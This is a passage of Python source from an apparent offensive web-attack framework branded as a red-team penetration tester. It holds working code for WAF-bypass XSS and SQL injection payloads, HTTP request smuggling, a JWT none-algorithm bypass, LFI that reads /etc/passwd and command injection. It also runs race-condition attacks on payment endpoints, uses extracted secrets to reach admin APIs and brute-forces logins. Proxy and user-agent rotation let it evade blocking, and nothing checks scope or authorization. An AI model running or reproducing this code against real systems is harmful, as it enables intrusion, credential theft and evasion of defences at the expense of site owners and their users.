                for match in re.findall(pattern, file_info['content'], re.I):
                    extracted.append({'type': secret_type, 'value': match, 'source': file_info['path']})
        chain.context['extracted_secrets'] = extracted
        return len(extracted) > 0

    def _step_use_secrets_for_access(self, chain):
        for secret in chain.context.get('extracted_secrets', []):
            if secret['type'] in ['API_KEY', 'SECRET']:
                headers = {'Authorization': f'Bearer {secret["value"]}', 'X-API-Key': secret['value']}
                resp = self.scanner.make_request('GET', f"{self.scanner.target_url}/api/admin", headers=headers)
                if resp and resp.status_code == 200:
                    self.scanner.log_result('CRITICAL', 'Access via Extracted Secret', f'Type: {secret["type"]}', 'Chain')
                    return True
        return False

    def _step_analyze_waf_rules(self, chain):
        if not self.scanner.waf_detected: return False
        chain.context['waf_type'] = self.scanner.waf_detected
        return True

    def _step_craft_waf_bypass_payloads(self, chain):
        waf_type = chain.context.get('waf_type', '')
        bypass_payloads = {
            'Cloudflare': ['<svg/onload=alert(1)>', "' UNION SELECT NULL-- -"],
            'AWS WAF': ['<img src=x onerror="alert(1)">', "' OR '1'='1'--"],
            'ModSecurity': ['<details open ontoggle=alert(1)>', "' OR 1=1#"],
        }
        chain.context['bypass_payloads'] = bypass_payloads.get(waf_type, [])
        return len(chain.context['bypass_payloads']) > 0

    def _step_execute_bypass_exploit(self, chain):
        success = False
        for payload in chain.context.get('bypass_payloads', []):
            resp = self.scanner.make_request('GET', f"{self.scanner.target_url}?q={quote(payload)}")
            if resp and resp.status_code == 200:
                self.scanner.log_result('CRITICAL', 'WAF Bypass Successful', f'WAF: {chain.context["waf_type"]}', 'Chain')
                success = True
        return success

    def _step_identify_race_target(self, chain):
        if not self.scanner.context.get('logic_flaws'): return False
        for flaw in self.scanner.context['logic_flaws']:
            if 'race_condition' in flaw['type']:
                match = re.search(r'Endpoint:\s*(/[^\s|]+)', flaw['description'])
                if match:
                    chain.context['race_endpoint'] = match.group(1)
                    return True
        return False

    def _step_exploit_race_condition(self, chain):
        endpoint = chain.context.get('race_endpoint')
        if not endpoint: return False
        url = f"{self.scanner.target_url}{endpoint}"
        threads = []
        responses = []
        def send_request():
            try:
                r = self.scanner.session.post(url, data={'amount': '1'}, timeout=5)
                responses.append(r.status_code)
            except: pass
        for _ in range(20):
            t = threading.Thread(target=send_request)
            threads.append(t)
            t.start()
        for t in threads: t.join()
        success_rate = sum(1 for r in responses if r == 200) / len(responses)
        chain.context['race_success_rate'] = success_rate
        return success_rate > 0.7

    def _step_verify_impact(self, chain):
        if chain.context.get('race_success_rate', 0) > 0.7:
            self.scanner.log_result('CRITICAL', 'RACE CONDITION EXPLOITED', f'Endpoint: {chain.context["race_endpoint"]} | Success Rate: {chain.context["race_success_rate"]:.0%}', 'Chain: Logic Flaw')
            return True
        return False


# ============================================================
# MAIN SCANNER CLASS
# ============================================================

class ProfessionalSecurityScanner:
    def __init__(self, target_url, config=None):
        self.target_url = target_url.rstrip('/')
        self.parsed_url = urlparse(target_url)
        self.hostname = self.parsed_url.hostname
        self.config = config or DEFAULT_CONFIG.copy()

        profile = SCAN_PROFILES.get(self.config['scan_profile'], SCAN_PROFILES['aggressive'])
        self.threads = self.config.get('threads', profile['threads'])
        self.timeout = self.config.get('timeout', profile['timeout'])
        self.delay = self.config.get('delay', profile['delay'])
        self.max_payloads = self.config.get('max_payloads', profile['max_payloads'])
        self.output_dir = self.config.get('output_dir', '/tmp/scan_results')
        self.self_protection_enabled = self.config.get('self_protection', False)

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        })

        self.results = []
        self.login_pages = []
        self.discovered_endpoints = []
        self.technology_stack = {}
        self.waf_detected = None
        self.ssl_info = {}
        self.evasion_mode = False
        self.scan_state_file = os.path.join(self.output_dir, 'scan_state.pkl')

        self.context = {
            'credentials': [], 'hashes': [], 'tokens': [], 'files_content': {},
            'users': [], 'versions': {}, 'internal_ips': [], 'api_keys': [], 'configs': {},
            'logic_flaws': []
        }

        self.perf = PerformanceTracker()
        self.cve_db = CVEDatabase(self.config.get('nvd_api_key', ''))
        
        self.block_detector = BlockDetector()
        self.proxy_rotator = ProxyRotator(self.config.get('proxies_file'))
        self.ua_rotator = UserAgentRotator()
        self.timing_controller = TimingController(base_delay=max(self.delay, 0.5))
        self.circuit_breaker = CircuitBreaker(failure_threshold=15, recovery_timeout=60)

        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
        logging.basicConfig(filename=os.path.join(self.output_dir, 'scanner.log'), level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)

    def banner(self):
        protection_status = f"{Fore.GREEN}ENABLED{Style.RESET_ALL}" if self.self_protection_enabled else f"{Fore.YELLOW}DISABLED{Style.RESET_ALL}"
        print(f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   {Fore.CYAN}Professional Red Team Penetration Testing Framework v14.0{Fore.RED}        ║
║   {Fore.YELLOW}Active Exploitation | Attack Chaining | Intelligence Validation{Fore.RED} ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")
        print(f"{Fore.CYAN}[*] Target:          {self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Profile:         {self.config['scan_profile']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Threads:         {self.threads} | Timeout: {self.timeout}s | Delay: {self.delay}s{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Self-Protection: {protection_status}{Style.RESET_ALL}")
        if self.self_protection_enabled and self.proxy_rotator.proxies:
            print(f"{Fore.CYAN}[*] Proxies Loaded:  {len(self.proxy_rotator.proxies)}{Style.RESET_ALL}")
        print()

    def log_result(self, severity, title, description, tool_source="Scanner"):
        result = {'severity': severity, 'title': title, 'description': description, 'tool': tool_source, 'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
        self.results.append(result)
        self.logger.info(f"[{severity}] {title} - {description}")
        color = {'CRITICAL': Fore.RED + Back.WHITE, 'HIGH': Fore.RED, 'MEDIUM': Fore.YELLOW, 'LOW': Fore.BLUE, 'INFO': Fore.WHITE}.get(severity, Fore.WHITE)
        print(f"{color}[{severity}]{Style.RESET_ALL} {title}")
        print(f"   {Fore.LIGHTBLACK_EX}{description}{Style.RESET_ALL}\n")

    def _add_realistic_headers(self):
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
        })

    def _handle_blocking(self, block_type, url, proxy_dict):
        self.perf.record_block(block_type)
        if block_type == 'rate_limit':
            self.timing_controller.adapt_to_blocking(block_type)
            self.log_result('MEDIUM', 'Rate Limit Detected', f'Increasing delays - URL: {url[:60]}', 'Self-Protection')
        elif block_type == 'waf_block':
            self.waf_detected = self.waf_detected or 'Unknown WAF'
            self.timing_controller.adapt_to_blocking(block_type)
            if proxy_dict:
                self.proxy_rotator.mark_failed(proxy_dict)
                self.proxy_rotator.rotate()
            self.log_result('MEDIUM', 'WAF Block Detected', f'Rotating identity - URL: {url[:60]}', 'Self-Protection')
        elif block_type == 'captcha':
            self.log_result('HIGH', 'CAPTCHA Challenge', f'Pausing 30s - URL: {url[:60]}', 'Self-Protection')
            time.sleep(30)
        elif block_type == 'ip_ban':
            if proxy_dict:
                self.proxy_rotator.mark_failed(proxy_dict)
                self.proxy_rotator.rotate()
            self.log_result('HIGH', 'IP Ban Detected', 'Switching to new proxy', 'Self-Protection')
        self.circuit_breaker.record_failure()

    def make_request(self, method, url, timing_critical=False, **kwargs):
        if timing_critical:
            kwargs.setdefault('timeout', self.timeout)
            kwargs.setdefault('allow_redirects', False)
            try:
                resp = self.session.request(method, url, **kwargs)
                self.perf.record_request(True)
                return resp
            except Exception:
                self.perf.record_request(False)
                return None
        
        if self.self_protection_enabled:
            if not self.circuit_breaker.can_proceed():
                self.log_result('MEDIUM', 'Circuit Breaker Active', 'Pausing operations', 'Self-Protection')
                return None
            self.timing_controller.wait()
            self.session.headers['User-Agent'] = self.ua_rotator.get_random()
            self._add_realistic_headers()
            if self.proxy_rotator.proxies:
                kwargs['proxies'] = self.proxy_rotator.get_proxy()
        
        if self.delay > 0 and not self.self_protection_enabled:
            time.sleep(self.delay)
        kwargs.setdefault('timeout', self.timeout)
        kwargs.setdefault('allow_redirects', False)
        
        if self.evasion_mode:
            if '?' in url: url += f"&_cb={int(time.time() * 1000)}"
            else: url += f"?_cb={int(time.time() * 1000)}"
        
        try:
            resp = self.session.request(method, url, **kwargs)
            self.perf.record_request(True)
            if self.self_protection_enabled:
                block_type = self.block_detector.classify(resp)
                if block_type != 'none':
                    self._handle_blocking(block_type, url, kwargs.get('proxies'))
                    return None
                self.circuit_breaker.record_success()
            return resp
        except requests.exceptions.ProxyError:
            if self.self_protection_enabled and 'proxies' in kwargs:
                self.proxy_rotator.mark_failed(kwargs['proxies'])
            return None
        except Exception:
            if self.self_protection_enabled:
                self.circuit_breaker.record_failure()
            self.perf.record_request(False)
            return None

    def load_payloads(self, filepath, max_count=None):
        if not os.path.exists(filepath):
            filename = os.path.basename(filepath)
            found_path = find_wordlist_fallback(WORDLIST_DIR, filename)
            if found_path: filepath = found_path
            else: return []
        payloads = []
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    p = line.strip()
                    if p and not p.startswith('#'):
                        payloads.append(p)
                        if max_count and len(payloads) >= max_count: break
        except Exception: pass
        return payloads

    def load_payloads_multi(self, filepaths, max_count=None):
        all_p = []
        for fp in filepaths: all_p.extend(self.load_payloads(fp, max_count=500))
        return list(set(all_p))[:max_count] if max_count else list(set(all_p))

    async def _async_request(self, session, url, semaphore):
        async with semaphore:
            if self.delay > 0 and not self.self_protection_enabled:
                await asyncio.sleep(self.delay)
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=self.timeout), allow_redirects=False, ssl=False) as resp:
                    self.perf.record_request(True)
                    return url, resp.status, await resp.text(errors='ignore'), len(await resp.read())
            except Exception:
                self.perf.record_request(False)
                return url, None, '', 0

    async def async_scan_urls(self, urls):
        semaphore = asyncio.Semaphore(self.threads)
        connector = aiohttp.TCPConnector(limit=self.threads, ssl=False)
        results = []
        async with aiohttp.ClientSession(connector=connector, headers=self.session.headers) as session:
            tasks = [self._async_request(session, url, semaphore) for url in urls]
            for coro in asyncio.as_completed(tasks): results.append(await coro)
        return results

    def fingerprint_technology(self):
        self.perf.start_phase('fingerprint')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 2] Technology Fingerprinting\n{'='*70}{Style.RESET_ALL}\n")
        resp = self.make_request('GET', self.target_url)
        if not resp: self.perf.end_phase('fingerprint'); return
        headers = {k.lower(): v for k, v in resp.headers.items()}
        html = resp.text.lower()
        signatures = {'WordPress': ['/wp-content/', 'wp-json'], 'Drupal': ['drupal.settings'], 'Joomla': ['/components/com_'], 'Laravel': ['laravel_session'], 'Django': ['csrfmiddlewaretoken'], 'Apache': ['apache'], 'Nginx': ['nginx'], 'PHP': ['x-powered-by: php']}
        for tech, patterns in signatures.items():
            for pattern in patterns:
                if pattern in html or pattern in str(headers):
                    self.technology_stack[tech] = True
                    self.context['versions'][tech] = 'detected'
                    self.log_result('INFO', f'Technology Detected: {tech}', f'Pattern: {pattern}', 'Fingerprint')
                    break
        server = headers.get('server', '')
        if server:
            self.technology_stack['Server'] = server
            version_match = re.search(r'(\w+)/(\d+\.\d+(?:\.\d+)?)', server)
            if version_match: self.context['versions'][version_match.group(1)] = version_match.group(2)
        self.perf.end_phase('fingerprint')

    def discover_and_test_forms(self):
        self.perf.start_phase('forms')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 3] Form Auto-Discovery\n{'='*70}{Style.RESET_ALL}\n")
        resp = self.make_request('GET', self.target_url)
        if not resp: self.perf.end_phase('forms'); return
        soup = BeautifulSoup(resp.text, 'lxml')
        forms = soup.find_all('form')
        print(f"{Fore.YELLOW}[*] Found {len(forms)} form(s){Style.RESET_ALL}\n")
        for i, form in enumerate(forms):
            action = urljoin(self.target_url, form.get('action', ''))
            method = form.get('method', 'get').lower()
            inputs = form.find_all(['input', 'textarea'])
            self.log_result('INFO', f'Form #{i+1}', f'{method.upper()} {action} | Fields: {len(inputs)}', 'Form Discovery')
            if method == 'post' and any(inp.get('type') == 'password' for inp in inputs):
                self.login_pages.append(action)
                self.log_result('MEDIUM', 'Login Form Detected', action, 'Form Discovery')
        self.perf.end_phase('forms')

    def analyze_security_headers(self):
        self.perf.start_phase('headers')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 4] Security Headers Analysis\n{'='*70}{Style.RESET_ALL}\n")
        resp = self.make_request('GET', self.target_url)
        if not resp: self.perf.end_phase('headers'); return
        req_headers = {'Strict-Transport-Security': ('HIGH', 'HSTS missing'), 'Content-Security-Policy': ('MEDIUM', 'CSP missing'), 'X-Frame-Options': ('MEDIUM', 'Clickjacking possible')}
        resp_headers = {k.lower(): v for k, v in resp.headers.items()}
        for header, (sev, desc) in req_headers.items():
            if header.lower() not in resp_headers: self.log_result(sev, f'Missing Header: {header}', desc, 'Headers')
        self.perf.end_phase('headers')

    def check_ssl_tls(self):
        self.perf.start_phase('ssl')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 8] SSL/TLS Analysis\n{'='*70}{Style.RESET_ALL}\n")
        if self.parsed_url.scheme != 'https': self.perf.end_phase('ssl'); return
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=self.hostname) as s:
                s.settimeout(self.timeout); s.connect((self.hostname, 443))
                cert = s.getpeercert(); cipher = s.cipher(); version = s.version()
                self.log_result('INFO', 'SSL/TLS Connected', f'{version} | {cipher[0]}', 'SSL')
                if version in ('TLSv1', 'TLSv1.1', 'SSLv3'): self.log_result('HIGH', 'Weak TLS Protocol', version, 'SSL')
        except Exception as e: self.log_result('MEDIUM', 'SSL Failed', str(e), 'SSL')
        self.perf.end_phase('ssl')

    def enumerate_subdomains(self):
        self.perf.start_phase('subdomains')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 9] Subdomain Enumeration\n{'='*70}{Style.RESET_ALL}\n")
        wl = self.config['wordlists']['subdomains']
        if not os.path.exists(wl): self.perf.end_phase('subdomains'); return
        subdomains = self.load_payloads(wl, max_count=500)
        base_domain = '.'.join(self.hostname.split('.')[-2:])
        urls = [f"http://{sub}.{base_domain}" for sub in subdomains]
        try:
            loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
            results = loop.run_until_complete(self.async_scan_urls(urls)); loop.close()
            for url, status, _, _ in tqdm(results, desc="Subdomains"):
                if status in (200, 301, 302, 403): self.log_result('INFO', 'Subdomain Found', url, 'Subdomain Enum')
        except Exception: pass
        self.perf.end_phase('subdomains')

    def detect_waf(self):
        self.perf.start_phase('waf')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 15] WAF Detection\n{'='*70}{Style.RESET_ALL}\n")
        resp = self.make_request('GET', self.target_url)
        if not resp: self.perf.end_phase('waf'); return
        headers_str = str(resp.headers).lower()
        wafs = {'Cloudflare': 'cf-ray', 'AWS WAF': 'x-amzn-waf', 'ModSecurity': 'mod_security'}
        for name, sig in wafs.items():
            if sig in headers_str:
                self.waf_detected = name
                self.log_result('MEDIUM', f'WAF Detected: {name}', sig, 'WAF')
                break
        if not self.waf_detected: self.log_result('INFO', 'No WAF Detected', 'Clean', 'WAF')
        self.perf.end_phase('waf')

    def test_api_endpoints(self):
        self.perf.start_phase('api')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 16] API Endpoint Testing\n{'='*70}{Style.RESET_ALL}\n")
        paths = ['/api', '/api/v1', '/graphql', '/swagger.json', '/actuator/health']
        for p in paths:
            resp = self.make_request('GET', urljoin(self.target_url + '/', p.lstrip('/')))
            if resp and resp.status_code in (200, 401, 403): self.log_result('INFO', f'API Endpoint: {p}', f'Status: {resp.status_code}', 'API')
        self.perf.end_phase('api')

    def comprehensive_directory_discovery(self):
        self.perf.start_phase('directories')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 1] Directory Discovery\n{'='*70}{Style.RESET_ALL}\n")
        all_paths = self.load_payloads_multi(self.config['wordlists']['directories'], max_count=self.max_payloads)
        urls = [urljoin(self.target_url + '/', p.lstrip('/')) for p in all_paths]
        try:
            loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
            results = loop.run_until_complete(self.async_scan_urls(urls)); loop.close()
            for url, status, _, size in tqdm(results, desc="Directories"):
                if status in (200, 301, 302, 401, 403):
                    path = urlparse(url).path
                    self.discovered_endpoints.append({'path': path, 'status': status, 'url': url})
                    self.log_result('HIGH' if status in (401, 403) else 'INFO', f'Discovered: {path}', f'Status: {status}', 'Dir Enum')
        except Exception: pass
        self.perf.end_phase('directories')

    def _run_injection_test(self, test_name, wordlist_keys, test_params, detection_fn):
        self.perf.start_phase(test_name.lower().replace(' ', '_'))
        print(f"\n{Fore.CYAN}{'='*70}\n[PHASE] {test_name}\n{'='*70}{Style.RESET_ALL}\n")
        wl_paths = self.config['wordlists']
        all_payloads = []
        for key in wordlist_keys:
            val = wl_paths.get(key, [])
            if isinstance(val, str): val = [val]
            all_payloads.extend(self.load_payloads_multi(val, max_count=self.max_payloads))
        all_payloads = list(set(all_payloads))
        found = False
        for param in tqdm(test_params, desc=test_name):
            if found: break
            for payload in all_payloads:
                test_url = f"{self.target_url}?{param}={quote(payload, safe='')}"
                resp = self.make_request('GET', test_url, timeout=15)
                result = detection_fn(resp, payload)
                if result:
                    self.log_result(result['severity'], result['title'], f'Param: {param} | Payload: {payload[:80]}', result['tool'])
                    found = True; break
        if not found: print(f"{Fore.GREEN}[+] No {test_name} detected{Style.RESET_ALL}")
        self.perf.end_phase(test_name.lower().replace(' ', '_'))

    def comprehensive_xss_testing(self):
        self._run_injection_test('XSS Testing', ['xss'], ['q', 'search', 'id', 'page'], lambda r, p: {'severity': 'HIGH', 'title': 'XSS Detected', 'tool': 'XSS'} if r and p in r.text else None)

    def comprehensive_sqli_testing(self):
        errs = ['sql syntax', 'mysql_fetch', 'ora-', 'unclosed quotation']
        self._run_injection_test('SQLi Testing', ['sqli'], ['id', 'user', 'page'], lambda r, p: {'severity': 'CRITICAL', 'title': 'SQLi Detected', 'tool': 'SQLi'} if r and any(e in r.text.lower() for e in errs) else None)

    def comprehensive_lfi_testing(self):
        inds = ['root:', '[extensions]', '<?php']
        self._run_injection_test('LFI Testing', ['lfi'], ['file', 'page', 'include'], lambda r, p: {'severity': 'CRITICAL', 'title': 'LFI Detected', 'tool': 'LFI'} if r and any(i in r.text for i in inds) else None)

    def comprehensive_command_injection_testing(self):
        self._run_injection_test('CmdInj Testing', ['command_injection'], ['cmd', 'ip', 'ping'], lambda r, p: {'severity': 'CRITICAL', 'title': 'CmdInj Detected', 'tool': 'CmdInj'} if r and ('root:' in r.text or 'uid=' in r.text) else None)

    def protocol_level_attacks(self):
        self.perf.start_phase('protocol_attacks')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 20] Protocol-Level Attacks\n{'='*70}{Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}[*] Testing HTTP Request Smuggling...{Style.RESET_ALL}")
        smuggle_payloads = ["POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n"]
        for payload in smuggle_payloads:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                if self.parsed_url.scheme == 'https':
                    context = ssl.create_default_context()
                    sock = context.wrap_socket(sock, server_hostname=self.hostname)
                    port = 443
                else: port = 80
                sock.connect((self.hostname, port))
                formatted_payload = payload.format(host=self.hostname)
                sock.send(formatted_payload.encode())
                response = sock.recv(4096).decode(errors='ignore')
                sock.close()
                if 'admin' in response.lower() and '403' not in response:
                    self.log_result('CRITICAL', 'HTTP Request Smuggling Detected', 'Payload detected', 'Protocol Attack')
            except Exception: pass
        self.perf.end_phase('protocol_attacks')

    def authentication_bypass(self):
        self.perf.start_phase('auth_bypass')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 21] Authentication Bypass\n{'='*70}{Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}[*] Testing JWT None Algorithm...{Style.RESET_ALL}")
        jwt_payloads = ["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9."]
        for jwt in jwt_payloads:
            headers = {'Authorization': f'Bearer {jwt}'}
            resp = self.make_request('GET', f"{self.target_url}/api/user", headers=headers)
            if resp and resp.status_code == 200 and 'error' not in resp.text.lower():
                self.log_result('CRITICAL', 'JWT Authentication Bypass', f'JWT: {jwt[:50]}...', 'Auth Bypass')
        self.perf.end_phase('auth_bypass')

    def advanced_sqli(self):
        self.perf.start_phase('advanced_sqli')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 22] Advanced SQL Injection\n{'='*70}{Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}[*] Testing Time-Based Blind SQLi...{Style.RESET_ALL}")
        time_payloads = [("' OR SLEEP(5)--", 5), ("'; WAITFOR DELAY '0:0:5'--", 5)]
        for param in ['id', 'user', 'page']:
            for payload, expected_delay in time_payloads:
                start = time.time()
                resp = self.make_request('GET', f"{self.target_url}?{param}={quote(payload)}", timeout=15, timing_critical=True)
                elapsed = time.time() - start
                if elapsed >= expected_delay - 0.5:
                    self.log_result('CRITICAL', 'Time-Based Blind SQLi Confirmed', f'Param: {param} | Delay: {elapsed:.2f}s', 'Advanced SQLi')
                    break
        self.perf.end_phase('advanced_sqli')

    def advanced_xss(self):
        self.perf.start_phase('advanced_xss')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 23] Advanced XSS\n{'='*70}{Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}[*] Testing Mutation XSS...{Style.RESET_ALL}")
        mutation_payloads = ['<img src=x onerror=alert(1)//', '<svg><animate onbegin=alert(1)>']
        for param in ['q', 'search', 'name']:
            for payload in mutation_payloads:
                resp = self.make_request('GET', f"{self.target_url}?{param}={quote(payload)}")
                if resp and payload in resp.text:
                    self.log_result('HIGH', 'Mutation XSS Detected', f'Param: {param}', 'Advanced XSS')
                    break
        self.perf.end_phase('advanced_xss')

    def race_condition_attacks(self):
        self.perf.start_phase('race_conditions')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 24] Race Condition Attacks\n{'='*70}{Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}[*] Testing Race Conditions...{Style.RESET_ALL}")
        def send_request(url, data):
            try: return self.session.post(url, data=data, timeout=self.timeout)
            except Exception: return None
        test_endpoints = ['/api/credit', '/api/coupon', '/checkout']
        for endpoint in test_endpoints:
            url = f"{self.target_url}{endpoint}"
            data = {'amount': '100'}
            threads = []; responses = []
            for _ in range(10):
                t = threading.Thread(target=lambda: responses.append(send_request(url, data)))
                threads.append(t); t.start()
            for t in threads: t.join()
            success_count = sum(1 for r in responses if r and r.status_code == 200)
            if success_count > 1:
                self.log_result('CRITICAL', 'Race Condition Vulnerability', f'{success_count}/10 succeeded', 'Race Condition')
        self.perf.end_phase('race_conditions')

    def advanced_evasion(self):
        self.perf.start_phase('advanced_evasion')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 25] Advanced Evasion Techniques\n{'='*70}{Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}[*] Testing Unicode Normalization Bypass...{Style.RESET_ALL}")
        unicode_payloads = ["ａｄｍｉｎ", "аdmin"]
        for payload in unicode_payloads:
            resp = self.make_request('GET', f"{self.target_url}/{payload}")
            if resp and resp.status_code == 200:
                self.log_result('MEDIUM', 'Unicode Normalization Bypass', f'Payload: {payload}', 'Evasion')
        self.perf.end_phase('advanced_evasion')

    def adapt_to_waf(self):
        if not self.waf_detected: return
        self.perf.start_phase('evasion')
        print(f"\n{Fore.CYAN}{'='*70}\n[RED TEAM] WAF Evasion Tactics Activated\n{'='*70}{Style.RESET_ALL}\n")
        self.delay = 1.5
        self.evasion_mode = True
        self.session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        self.log_result('INFO', 'Evasion Activated', f'Delay: {self.delay}s', 'Red Team')
        self.perf.end_phase('evasion')

    def validate_exploitation(self):
        self.perf.start_phase('poe_validation')
        print(f"\n{Fore.CYAN}{'='*70}\n[RED TEAM] Proof of Exploitation (PoE)\n{'='*70}{Style.RESET_ALL}\n")
        proven = 0
        lfi_payloads = ['../../../../etc/passwd', '....//....//....//etc/passwd', '/etc/passwd']
        for param in ['file', 'page', 'include', 'path', 'doc']:
            for payload in lfi_payloads:
                resp = self.make_request('GET', f"{self.target_url}?{param}={quote(payload)}")
                if resp and 'root:' in resp.text and '/bin/bash' in resp.text:
                    proof = resp.text[:150].replace('\n', ' ')
                    self.log_result('CRITICAL', 'LFI PROVEN: /etc/passwd Extracted', f'Param: {param} | Proof: {proof}...', 'Red Team PoE')
                    proven += 1; break
            if proven > 0: break
        cmd_payloads = ['; id', '| id', '`id`', '$(id)']
        for param in ['cmd', 'exec', 'command', 'ip', 'ping']:
            for payload in cmd_payloads:
                resp = self.make_request('GET', f"{self.target_url}?{param}={quote(payload)}", timeout=15)
                if resp and ('uid=' in resp.text or 'root' in resp.text):
                    proof = resp.text[:150].replace('\n', ' ')
                    self.log_result('CRITICAL', 'RCE PROVEN: Command Executed', f'Param: {param} | Proof: {proof}...', 'Red Team PoE')
                    proven += 1; break
            if proven > 1: break
        if proven == 0: print(f"{Fore.YELLOW}[!] No vulnerabilities could be actively proven.{Style.RESET_ALL}")
        else: print(f"{Fore.GREEN}[+] Successfully proven {proven} vulnerabilities.{Style.RESET_ALL}")
        self.perf.end_phase('poe_validation')

    def automated_credential_stuffing(self):
        self.perf.start_phase('cred_stuffing')
        print(f"\n{Fore.CYAN}{'='*70}\n[RED TEAM] Automated Credential Stuffing\n{'='*70}{Style.RESET_ALL}\n")
        if not self.login_pages:
            print(f"{Fore.YELLOW}[!] No login pages discovered.{Style.RESET_ALL}")
            self.perf.end_phase('cred_stuffing'); return
        pwd_path = self.config['wordlists'].get('top_passwords', self.config['wordlists']['passwords'])
        if not os.path.exists(pwd_path): pwd_path = self.config['wordlists']['passwords']
        passwords = self.load_payloads(pwd_path, max_count=200)
        usernames = ['admin', 'administrator', 'root', 'user', 'test']
        print(f"{Fore.YELLOW}[*] Testing {len(usernames)} users x {len(passwords)} passwords on {len(self.login_pages)} pages...{Style.RESET_ALL}")
        for login_url in self.login_pages:
            resp = self.make_request('GET', login_url)
            if not resp: continue
            soup = BeautifulSoup(resp.text, 'lxml')
            for form in soup.find_all('form'):
                pwd_field = form.find('input', {'type': 'password'})
                user_field = form.find('input', attrs={'name': lambda x: x and any(k in x.lower() for k in ['user', 'name', 'email', 'login'])})
                if not pwd_field or not user_field: continue
                pwd_name = pwd_field.get('name'); user_name = user_field.get('name')
                action_url = urljoin(login_url, form.get('action', ''))
                method = form.get('method', 'post').lower()
                for user in usernames:
                    for pwd in passwords:
                        data = {user_name: user, pwd_name: pwd}
                        try:
                            if method == 'post':
                                r = self.session.post(action_url, data=data, allow_redirects=False, timeout=self.timeout)
                            else:
                                r = self.session.get(action_url, params=data, allow_redirects=False, timeout=self.timeout)
                            if r.status_code in [301, 302] or ('invalid' not in r.text.lower() and 'error' not in r.text.lower()):
                                if 'dashboard' in r.text.lower() or 'welcome' in r.text.lower() or r.status_code == 200:
                                    self.log_result('CRITICAL', 'VALID CREDENTIALS FOUND', f'URL: {login_url} | User: {user} | Pass: {pwd}', 'Red Team Brute-Force')
                                    self.perf.end_phase('cred_stuffing'); return
                        except Exception: continue
        print(f"{Fore.GREEN}[+] Credential stuffing complete.{Style.RESET_ALL}")
        self.perf.end_phase('cred_stuffing')

    def run_ffuf(self):
        self.perf.start_phase('ffuf')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 27] ffuf - Fast Web Fuzzer\n{'='*70}{Style.RESET_ALL}\n")
        output_file = os.path.join(self.output_dir, 'ffuf_results.json')
        wordlist = self.config['wordlists']['directories'][0]
        try:
            cmd = ['ffuf', '-u', f'{self.target_url}/FUZZ', '-w', wordlist, '-fc', '404', '-mc', '200,201,301,302,401,403,500', '-t', str(self.threads), '-timeout', str(self.timeout), '-of', 'json', '-o', output_file, '-s']
            print(f"{Fore.YELLOW}[*] Running ffuf directory discovery...{Style.RESET_ALL}")
            subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    data = json.load(f); results = data.get('results', [])
                    for result in results:
                        status = result.get('status'); path = result.get('input', {}).get('FUZZ', '')
                        url = result.get('url', ''); size = result.get('length', 0)
                        severity = 'HIGH' if status in [401, 403] else 'INFO'
                        self.log_result(severity, f'ffuf: {path}', f'Status: {status} | Size: {size}', 'ffuf')
